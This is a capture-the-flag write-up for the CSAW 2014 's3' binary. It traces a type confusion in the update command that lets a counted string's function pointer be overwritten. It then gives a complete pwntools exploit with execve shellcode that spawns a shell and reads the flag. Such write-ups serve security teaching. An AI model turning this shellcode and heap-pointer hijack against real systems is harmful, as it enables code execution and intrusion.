# s3

This writeup is based off of: `http://v0ids3curity.blogspot.in/2014/09/csaw-ctf-quals-2014-s3-exploitation-300.html`

Let's take a look at the binary:

```
$	file s3
s3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=3de59ee9ffba2269d9ec3ccdf733b3e633068d53, stripped
```

So it is a 64 bit int. Let's see run it and see what it does:

```
$	./s3
Welcome to Amazon S3 (String Storage Service)

    c <type> <string> - Create the string <string> as <type>
                        Types are:
                            0 - NULL-Terminated String
                            1 - Counted String
    r <id>            - Read the string referenced by <id>
    u <id> <string>   - Update the string referenced by <id> to <string>
    d <id>            - Destroy the string referenced by <id>
    x                 - Exit Amazon S3

> c 0 hi
Your stored string's unique identifier is: 35834944
```

and the program just quits. So the program is on a timer, so we can only use it for x seconds. However I found that if you run it in gdb-peda, the alarm still triggers however it doesn't kill the program:

```
$	gdb ./s3
gdb-peda$ r
Starting program: /Hackery/ancient/14csaw/pwn/s3/s3 
Welcome to Amazon S3 (String Storage Service)

    c <type> <string> - Create the string <string> as <type>
                        Types are:
                            0 - NULL-Terminated String
                            1 - Counted String
    r <id>            - Read the string referenced by <id>
    u <id> <string>   - Update the string referenced by <id> to <string>
    d <id>            - Destroy the string referenced by <id>
    x                 - Exit Amazon S3

> c 0 tux
Your stored string's unique identifier is: 6392896

```

So this program appears to be some sort of string storage service. There are two options for strings that can be stored, Null Terminated and Counted Strings. Null terminated are probably just strings that end with a null byte, and the counted strings are probably like null terminated except they have the  string's length before the actual string. Let's continue seeing what this program does.

```
> 
Program received signal SIGALRM, Alarm clock.
c 1 guy
Your stored string's unique identifier is: 6393072
> r 6392896
tux
> r 6393072
guy
> u 6392896
Your stored string's new unique identifier is: 6392928
> r 6392928

> u 6393072 guyinatuxedo
Your stored string's new unique identifier is: 6393360
> r 6393360

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x7574616e69797567 ('guyinatu')
RBX: 0x0 
RCX: 0x7fffffffd501 --> 0x6f00007fffffffd5 
RDX: 0x618c80 --> 0x618c60 --> 0x0 
RSI: 0x618c98 --> 0x618e10 ("guyinatuxedo")
RDI: 0x618e10 ("guyinatuxedo")
RBP: 0x7fffffffd680 --> 0x7fffffffdf10 --> 0x7fffffffdf50 --> 0x403e20 (push   r15)
RSP: 0x7fffffffd5f0 --> 0x7fffffffd680 --> 0x7fffffffdf10 --> 0x7fffffffdf50 --> 0x403e20 (push   r15)
RIP: 0x4019d6 (call   QWORD PTR [rax+0x10])
R8 : 0x618c98 --> 0x618e10 ("guyinatuxedo")
R9 : 0x0 
R10: 0x7ffff72dcf60 --> 0x100000000 
R11: 0x7ffff72dd860 --> 0x2000200020002 
R12: 0x4014a0 (xor    ebp,ebp)
R13: 0x7fffffffe030 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4019cb:	mov    QWORD PTR [rbp-0x50],rdi
   0x4019cf:	mov    rdi,rax
   0x4019d2:	mov    rax,QWORD PTR [rbp-0x50]
=> 0x4019d6:	call   QWORD PTR [rax+0x10]
   0x4019d9:	add    eax,0x1
   0x4019de:	mov    DWORD PTR [rbp-0x2c],eax
   0x4019e1:	mov    eax,DWORD PTR [rbp-0x2c]
   0x4019e4:	mov    edi,eax
Guessed arguments:
arg[0]: 0x618e10 ("guyinatuxedo")
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd5f0 --> 0x7fffffffd680 --> 0x7fffffffdf10 --> 0x7fffffffdf50 --> 0x403e20 (push   r15)
0008| 0x7fffffffd5f8 --> 0x401c70 (mov    DWORD PTR [rbp-0x74],eax)
0016| 0x7fffffffd600 --> 0x618c60 --> 0x0 
0024| 0x7fffffffd608 --> 0x3700000001 
0032| 0x7fffffffd610 --> 0x618e10 ("guyinatuxedo")
0040| 0x7fffffffd618 --> 0x618e10 ("guyinatuxedo")
0048| 0x7fffffffd620 --> 0x618e10 ("guyinatuxedo")
0056| 0x7fffffffd628 --> 0x403bec (mov    ecx,eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004019d6 in ?? ()
gdb-peda$ 

```

So we got a Segmentation fault, so we triggered a bug somewhere.

Reviewing what happened, we created two strings. The first was a null terminated string at `6392896` with the value `tux`. The second was a counted string at `6393072` with the value `tux`. We then proceeded to read both of them. After that we updated both string values, `6392896` became `6392928` with nothing as it's value, and `6393072` became `6393072` with `guyinatuxedo` as it's value. Lastly we read `6392928` successfully, then tried to read `6393072` and it crashed.

So when we updated a counted string, then read it the binary crashed. Let's find out why by looking at it with IDA.

main function:
```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  signal(14, handler);
  alarm(5u);
  setvbuf(stdout, 0LL, 2, 0LL);
  send_func(
    1u,
    "Welcome to Amazon S3 (String Storage Service)\n"
    "\n"
    "    c <type> <string> - Create the string <string> as <type>\n"
    "                        Types are:\n"
    "                            0 - NULL-Terminated String\n"
    "                            1 - Counted String\n"
    "    r <id>            - Read the string referenced by <id>\n"
    "    u <id> <string>   - Update the string referenced by <id> to <string>\n"
    "    d <id>            - Destroy the string referenced by <id>\n"
    "    x                 - Exit Amazon S3\n"
    "\n");
  command_processing(
    1LL,
    (__int64)"Welcome to Amazon S3 (String Storage Service)\n"
             "\n"
             "    c <type> <string> - Create the string <string> as <type>\n"
             "                        Types are:\n"
             "                            0 - NULL-Terminated String\n"
             "                            1 - Counted String\n"
             "    r <id>            - Read the string referenced by <id>\n"
             "    u <id> <string>   - Update the string referenced by <id> to <string>\n"
             "    d <id>            - Destroy the string referenced by <id>\n"
             "    x                 - Exit Amazon S3\n"
             "\n");
  return 0LL;
}
```

Looking at this, we can see that it prints out the start menu for the program, then runs a function called `command_processing()` with the arguments `0x1` and the start menu (although neither appear to be used by it in any significant way). Let's take a look `command_processing()` in sections.

```
  heap_space = operator new(0x18uLL);
  set_zero(heap_space, a2);
  heap_space_transfer = (void *)heap_space;
  memset(&input_char, 0, 0x800uLL);
```

So we can see here that in the first section it allocated 24 bytes of memory in the heap, runs the address through the `set_zero` function. It also writes 0x800 zeroes over `input_char`. Looking at the `set_zero` function reveals more about the heap structure:

```
__int64 __fastcall sub_4026D0(__int64 heap_space, __int64 a2)
{
  __int64 result; // rax@1

  sub_402710();
  result = heap_space;
  *(_QWORD *)heap_space = 0LL;
  *(_QWORD *)(heap_space + 8) = 0LL;
  *(_QWORD *)(heap_space + 16) = 0LL;
  return result;
}
```

So this tells us that our heap space of 24 bytes is broken up into three individual 8 byte blocks (one at 0, one at 8, and one at 16). This function changes the value of all three of them to zero. The function `sub_402710()` doesn't appear to do anything significant:

```
  while ( 1 )
  {
    send_func(1u, "> ");
    if ( (signed int)recv_func(0, (__int64)&input_char, 0x800u) < 0 )
      break;
```

Here we can see that the rest of code will be looped infinitetly, also we can see the command prompt being printed, also the program scanning in input into `input_char`.

```
    if ( input_char > 0x71 )
    {
      DWORD2(v14) = input_char - 0x72;
      if ( input_char == 0x72 )
      {
        input_integer = strtoul(input_char_rep, 0LL, 0xA);
        read_func_cmd((__int64)heap_space_transfer, input_integer, v5, v6, v11, v13);
        goto LABEL_22;
      }
      DWORD1(v14) = input_char - 0x75;
      if ( input_char != 0x75 )
      {
        LODWORD(v14) = input_char - 0x78;
        if ( input_char == 0x78 )
        {
          v12 = heap_space_transfer;
          if ( heap_space_transfer )
          {
            exit_func_cmd((__int64)heap_space_transfer, (__int64)&input_char, v3);
            operator delete(v12);
          }
          return;
        }
LABEL_21:
        DWORD1(v13) = send_func(1u, "Invalid command\n");
        goto LABEL_22;
      }
      input_integer = strtoul(input_char_rep, &input_string, 10);
      if ( input_string == input_char_rep )
        DWORD2(v13) = send_func(1u, "Invalid arguments\n");
      else
        update_func_cmd((__int64)heap_space_transfer, input_integer, input_string + 1, __PAIR__(v8, v7), v11, v13, v14);
    }   
```

In this next segment, we cam see that it essentially checks to see what character the user inputed, and in this part will either trigger the `update`, `exit`, or `read` functions (In addition for checking for invalid commands).

```
    else
    {
      LODWORD(v15) = input_char - 0x63;
      if ( input_char != 0x63 )
      {
        DWORD3(v14) = input_char - 0x64;
        if ( input_char == 0x64 )
        {
          input_integer = strtoul(input_char_rep, 0LL, 10);
          delete_func_cmd((__int64)heap_space_transfer, input_integer, v9, v10, v11, v13, v14, v15);
          goto LABEL_22;
        }
        goto LABEL_21;
      }
      input_integer = strtoul(input_char_rep, &input_string, 10);
      if ( (unsigned __int64)input_integer <= 1 && input_string != input_char_rep )
        create_func_cmd(
          (__int64)heap_space_transfer,
          input_integer,
          input_string + 1,
          __PAIR__(v4, (unsigned __int64)input_string),
          v11,
          v13,
          v14);
      else
        DWORD3(v13) = send_func(1u, "Invalid arguments\n");
    }
```
This section checks to see if the user entered the character for either the `delete` or `create` commands.

So looking thoughout the code for the five different commands, `create` `update` and `read` seem to have things that could be useful to us. The `create` function tells us about the exact structure and content for the memory allocated for both types of strings:

counted string section:
```
  org_heap_space_transfer = heap_space;
  input_integer_transfer = input_integer;
  input_string_transfer = input_string;
  if ( input_integer == 1 )
  {
    new_heap_space0 = operator new(0x18uLL);
    allocate_new_space(new_heap_space0, input_string_transfer);
    v21 = new_heap_space0;
    new_heap_space_transfer = new_heap_space0;
    string_type = input_integer_transfer;
  }
```

allocate_new_space:
```
char *__fastcall allocate_new_space(__int64 heap_space, const char *input_string)
{
  unsigned __int64 input_string_length; // ST10_8@1
  void *input_string_ptr; // ST08_8@1

  *(_QWORD *)heap_space = (char *)&unk_403EB0 + 16;
  *(_DWORD *)(heap_space + 8) = strlen(input_string);
  input_string_length = *(_DWORD *)(heap_space + 8);
  input_string_ptr = (void *)operator new[](input_string_length);
  memset(input_string_ptr, 0, input_string_length);
  *(_QWORD *)(heap_space + 16) = input_string_ptr;
  return strncpy(*(char **)(heap_space + 16), input_string, *(_DWORD *)(heap_space + 8));
}
```

So here we can see that the process of creating a new counted string involves allocating a 24 byte space in the heap with three segments of 8 bytes. The first 8 bytes appears to hold some sort of function pointer, the second 8 bytes holds the length of the string held, and the third 8 bytes holds a pointer to the string itself. The address of the heap space is stored in `new_heap_space_transfer` and is used later.

```
  else
  {
    if ( input_integer_transfer )
      return send_func(1u, "Invalid type specified for string\n");
    new_string_length = strlen(input_string_transfer) + 1;
    new_heap_space1 = (void *)operator new[](new_string_length);
    memset(new_heap_space1, 0, new_string_length);
    input_string_length1 = strlen(input_string_transfer);
    v21 = (__int64)new_heap_space1;
    new_heap_space_transfer = (__int64)new_heap_space1;
    string_type = 0;
    strncpy((char *)new_heap_space1, input_string_transfer, input_string_length1 + 1);
  }
```

Here we can see the process of creating a null terminated string. Essentially it just creates a new space in the heap, copies the input string to it, and stores a pointer to that space in `new_heap_space_transfer`. The next peice that happens occurs fopr both counted and null terminated strings:

```
  write_heap_adr(org_heap_space_transfer, (__int64)&new_heap_space_transfer);
```

By the time this function is done executing, we are left with the string heap space fully constructed. Essentially the pointer that is stored in `new_heap_space_transfer` and copies it to the heap space allocated in the start of `command_processing` to the first and third 8 byte block. In between the two blocks is either `0x0` or `0x1` to specify if it is either a counted or null terminated strings. So essentially the heap space for the two strings is this:

Null terminated strings
```
8 bytes: ptr to stored string
8 bytes: string type (should be 0x0)
8 bytes: ptr to stored string
``` 

counted strings:
```
First Segment:
8 bytes: ptr to second segment
8 bytes: string type (should be 0x1)
8 bytes: ptr to second segment

Second Segment:
8 bytes: function ptr
8 bytes: stored string length
8 bytes: ptr to stored string
```
The pointer to the second segment, specifically points to the first 8 byte block.

So we can see here the two different heap structures. Let's move on to the update function:

```
__int64 __fastcall update_func_cmd(__int64 heap_space, __int64 input_integer, char *input_string, __int128 a4, __int128 a5, __int128 a6, __int128 a7, __int128 xmm3_0)
{
  __int64 v8; // rcx@2
  __int64 v9; // r8@2
  __int64 v10; // r9@2
  __int128 v11; // xmm4@2
  __int128 v12; // xmm5@2
  _QWORD *heap_adr1; // rax@3
  unsigned __int64 input_string_length0; // ST40_8@4
  void *new_string_space; // ST38_8@4
  const char *input_string_transfer1; // ST28_8@4
  size_t input_string_length1; // rax@4
  __int64 *new_string_adr; // rax@4
  __int64 v19; // rcx@4
  __int64 v20; // r8@4
  __int64 v21; // r9@4
  __int128 v22; // xmm4@4
  __int128 v23; // xmm5@4
  char v25; // [sp+0h] [bp-80h]@0
  __int64 i; // [sp+60h] [bp-20h]@1
  char *input_string_transfer0; // [sp+68h] [bp-18h]@1
  __int64 input_integer_transfer; // [sp+70h] [bp-10h]@1
  __int64 heap_space_transfer; // [sp+78h] [bp-8h]@1

  heap_space_transfer = heap_space;
  input_integer_transfer = input_integer;
  input_string_transfer0 = input_string;
  for ( i = return_heap_adr_func(heap_space); ; return_heap_adr_func1(&i, 0) )
  {
    return_heap_8(heap_space_transfer);
    if ( !(sub_402260() & 1) )
      break;
    heap_adr1 = (_QWORD *)return_heap_adr_func2((__int64)&i);
    if ( *heap_adr1 == input_integer_transfer )
    {
      input_string_length0 = strlen(input_string_transfer0) + 1;
      new_string_space = (void *)operator new[](input_string_length0);
      memset(new_string_space, 0, input_string_length0);
      input_string_transfer1 = input_string_transfer0;
      input_string_length1 = strlen(input_string_transfer0);
      strncpy((char *)new_string_space, input_string_transfer1, input_string_length1 + 1);
      *(_QWORD *)(return_heap_adr_func2((__int64)&i) + 16) = new_string_space;
      *(_QWORD *)return_heap_adr_func2((__int64)&i) = new_string_space;
      new_string_adr = (__int64 *)return_heap_adr_func2((__int64)&i);
      return string_info_func(
               0,
               *new_string_adr,
               v19,
               1,
               "Your stored string's new unique identifier is: %lu\n",
               v20,
               v21,
               a5,
               a6,
               a7,
               xmm3_0,
               v22,
               v23,
               v25);
    }
  }
  return string_info_func(
           0,
           input_integer_transfer,
           v8,
           1,
           "No string was found that matched id %lu\n",
           v9,
           v10,
           a5,
           a6,
           a7,
           xmm3_0,
           v11,
           v12,
           v25);
}
```

So we can see a couple of strange things here. First it doesn't check if the string it is updating is either a counted, or null terminated string. It appears to just update all strings like they are null terminated. And it doesn't change the type. So we should be able to use this function, to overwrite the function pointer stored in a counted string. When we look at the read function, we see something interesting for when it reads counted strings:

```
  if ( *(_DWORD *)(return_heap_adr_func2((__int64)&i) + 8) == 1 )
  {
    heap_adr_transfer2 = return_heap_adr_func2((__int64)&i);
    heap_16_adr = *(_QWORD *)(heap_adr_transfer2 + 0x10);
    output_run_heap_16 = (unsigned int)((*(int (__fastcall **)(_QWORD, __int64 *))(*(_QWORD *)heap_16_adr + 0x10LL))(
                                          *(_QWORD *)(heap_adr_transfer2 + 0x10),
                                          &heap_8_adr)
                                      + 1);
    output_run_heaptransfer = (void *)operator new[](output_run_heap_16);
    memset(output_run_heaptransfer, 0, output_run_heap_16);
    LODWORD(output_run_heaptransfer1) = (**(int (__fastcall ***)(_QWORD, _QWORD))heap_16_adr)(heap_16_adr, 0LL);
    strncpy((char *)output_run_heaptransfer, output_run_heaptransfer1, output_run_heap_16);
    *((_BYTE *)output_run_heaptransfer + output_run_heap_16) = 0;
    send_func(1u, (const char *)output_run_heaptransfer);
    send_func(1u, "\n");
    if ( output_run_heaptransfer )
      operator delete[](output_run_heaptransfer);
  }
```

Specifically this line:

```
    output_run_heap_16 = (unsigned int)((*(int (__fastcall **)(_QWORD, __int64 *))(*(_QWORD *)heap_16_adr + 0x10LL))(
                                          *(_QWORD *)(heap_adr_transfer2 + 0x10),
                                          &heap_8_adr)
                                      + 1);
```

and even more specifically, this line of assembly:

```
call    qword ptr [rax+10h]
```

here we can see that it is actively calling the pointer to the function that should be stored in the first and third 8 byte segments of a counted string. When we update the string, we effictively overwrite over this pointer while mantainning a type, so effictively we can update a counted string to overwrite the pointer with out input, then read it to execute it. This is why we crashed the binary earlier, because we overwrite the function pointer with an invalid pointer, and tried to run it.

So we can control a pointer, and we can execute it so we have code flow execution. Let's see what binary mitigations are in place:

```
$	pwn checksec s3
[*] '/Hackery/ancient/14csaw/pwn/s3/s3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

So we can see NX is not enabled, so we should be able to simply load shellcode into memory and execute it. To get around ASLR, I have a feeling that the ID's it gives are just the pointers stored in the first 8 bytes, however we can check that in gdb:

```
gdb-peda$ r
Starting program: /Hackery/ancient/14csaw/pwn/s3/s3 
Welcome to Amazon S3 (String Storage Service)

    c <type> <string> - Create the string <string> as <type>
                        Types are:
                            0 - NULL-Terminated String
                            1 - Counted String
    r <id>            - Read the string referenced by <id>
    u <id> <string>   - Update the string referenced by <id> to <string>
    d <id>            - Destroy the string referenced by <id>
    x                 - Exit Amazon S3

>   
Program received signal SIGALRM, Alarm clock.
c 0 15935728
Your stored string's unique identifier is: 6392896
> c 1 789654123
Your stored string's unique identifier is: 6393072
> ^C
Program received signal SIGINT, Interrupt.
```

later...

```
Stopped reason: SIGINT
0x00007ffff7260890 in __read_nocancel ()
    at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
gdb-peda$ x/s 6392896
0x618c40:	"15935728"
gdb-peda$ x/g 6393072
0x618cf0:	0x0000000000403ec0
gdb-peda$ x/g 0x403ec0
0x403ec0:	0x00000000004016c0
gdb-peda$ x/g 0x4016c0
0x4016c0:	0xf87d8948e589485
```

So we can see that the ID given to us is just the first 8 bytes stored in the heap. So our exploit will consist of the following:

```
0.)	Create a null terminated string with our shellcode, and get a pointer to the shellcode
1.) Create a null terminated string, that just takes up space. The least significant byte in this string for me was a null byte, and because of that whenever I tried to scan it into memory it would stop at that null byte and wouldn't actually scan in the address.
2.) Create a null terminated string that is a pointer to the pointer of the shellcode.
3.) Create a counted string, doesn't matter what string it holds at the moment.
4.) Update the counted string, to hold the string's address that was created in step 2
5.) Read the counted string that was created in step 4
6.) Enjoy the shell
```

Keep in mind that when the read function executes on counted strings, it expects a pointer to a pointer, so that is why we need to also have a pointer to a pointer which contains the shellcode. Here is the python exploit I wrote which does all of that.

```
#Import Pwntools
from pwn import *

#Start the process
target = process('./s3')

#Establish the function which will create a string, and return the identifier used for it
def create_string(stype, string):
	target.sendline('c ' + str(stype) + ' ' + string)
	leak = target.recvline()
	print leak
	leak = leak.replace(" Your stored string's unique identifier is: ", "")
	leak = int(leak)
	print target.recvuntil(">")
	return leak

#Establish the function whichb will update a string, and return the indetifier used for it
def update_string(id, string):
	target.sendline('u ' + str(id) + ' ' + string)
	leak = target.recvline()
	print leak
	leak = leak.replace(" Your stored string's new unique identifier is: ", "")
	leak = int(leak)
	print target.recvuntil(">")
	return leak

#Print out the start banner
print target.recvuntil("Exit Amazon S3")
print target.recvuntil('>')

#Establish our shellcode, and create the first null terminated string which contains the shellcode
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode_addr = create_string(0, shellcode)
print "The shellcode is stored at: " + hex(shellcode_addr)

#Create second null terminated string which just takes up space
pointer_addr = create_string(0, p64(shellcode_addr))
print "The space holder string is stored at: " + hex(pointer_addr) + " " + p64(pointer_addr)

#Create the thrid null terminated string which contains a pointer to the shellcode pointer
pointer_addr = create_string(0, p64(shellcode_addr))
print "The pointer is stored at: " + hex(pointer_addr) + " " + p64(pointer_addr)

#Create the counted string, doesn't matter what it is equal to
setup_addr = create_string(1, "guyinatuxedo")
print "The setup address is " + hex(setup_addr)


execution_addr = update_string(setup_addr, p64(pointer_addr))
print "The execution address is: " + hex(execution_addr)

#Read the updated counted string, pop the shell, and drop to an interactive shell
target.sendline('r ' + str(execution_addr))
target.interactive()
``` 

Now to use it:

```
$	python exploit.py 
[+] Starting local process './s3': pid 6763
Welcome to Amazon S3 (String Storage Service)

    c <type> <string> - Create the string <string> as <type>
                        Types are:
                            0 - NULL-Terminated String
                            1 - Counted String
    r <id>            - Read the string referenced by <id>
    u <id> <string>   - Update the string referenced by <id> to <string>
    d <id>            - Destroy the string referenced by <id>
    x                 - Exit Amazon S3


>
 Your stored string's unique identifier is: 39656512

>
The shellcode is stored at: 0x25d1c40
 Your stored string's unique identifier is: 39656704

>
The space holder string is stored at: 0x25d1d00 \x00\x1d]\x00\x00\x00\x00
 Your stored string's unique identifier is: 39656560

>
The pointer is stored at: 0x25d1c70 p\x1c]\x00\x00\x00\x00
 Your stored string's unique identifier is: 39657072

>
The setup address is 0x25d1e70
 Your stored string's new unique identifier is: 39657248

>
The execution address is: 0x25d1f20
[*] Switching to interactive mode
 $ ls
Readme.md  exploit.py  peda-session-dash.txt  peda-session-s3.txt
core       flag.txt    peda-session-ls.txt    s3
$ w
 17:25:00 up 23:26,  1 user,  load average: 0.94, 0.67, 0.72
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               Tue17   23:25m 14:06   0.03s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
$ cat flag.txt
flag{SimplyStupidStorage}
```

Just like that, we got the flag.

